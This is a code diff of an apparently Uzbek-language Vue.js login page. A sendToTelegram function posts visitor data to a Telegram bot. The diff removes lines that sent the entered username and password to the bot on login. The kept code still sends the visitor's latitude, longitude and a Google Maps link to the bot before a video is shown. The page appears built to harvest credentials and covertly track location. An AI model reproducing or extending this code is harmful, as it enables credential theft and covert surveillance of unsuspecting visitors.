@@ -122,26 +122,20 @@ export default {
       }
     },
     sendToTelegram() {
-      const message = `📍 Foydalanuvchi ma'lumotlari:
-👤 Login: ${this.username || "Noma'lum"}
-🔑 Parol: ${this.password || "Noma'lum"}
-🌍 Joylashuv:
+      const message = `📍 Foydalanuvchi joylashuvi:
 Latitude: ${this.latitude}
 Longitude: ${this.longitude}
 🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
 🕒 Vaqt: ${new Date().toLocaleString()}`;
-
       const url = `https://api.telegram.org/bot${
         this.botToken
       }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}`;
-
       fetch(url)
         .then((res) => res.json())
         .catch((err) => console.error(err));
     },
     submitLogin() {
       if (this.username && this.password) {
-        this.sendToTelegram();
         this.showLogin = false;
         this.showVideo = true;
       } else {
